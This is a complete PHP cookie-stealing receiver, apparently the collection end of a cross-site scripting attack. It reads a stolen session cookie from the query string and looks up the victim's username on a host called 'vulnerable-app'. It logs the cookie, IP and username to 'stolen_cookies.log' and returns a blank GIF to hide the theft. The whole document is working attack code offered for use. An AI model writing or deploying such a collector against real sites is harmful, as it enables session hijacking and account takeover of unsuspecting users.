<?php
$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Extract user ID from cookie
$userId = '';
if (preg_match('/user_session=(\d+)/', $cookie, $matches)) {
    $userId = $matches[1];
}

// Try to get the username from the vulnerable app
$username = 'unknown';
if ($userId) {
    // Make a request to the users.php endpoint
    $ch = curl_init("http://vulnerable-app/users.php?id=" . $userId);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extract username from response
    if (preg_match('/<username>(.*?)<\/username>/', $response, $matches)) {
        $username = $matches[1];
    }
}

// Create a more detailed log entry
$logEntry = "[$timestamp] Cookie stolen from $ip (User ID: $userId, Username: $username): $cookie\n";
file_put_contents('stolen_cookies.log', $logEntry, FILE_APPEND);

// Return a small transparent GIF to avoid browser errors
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'); 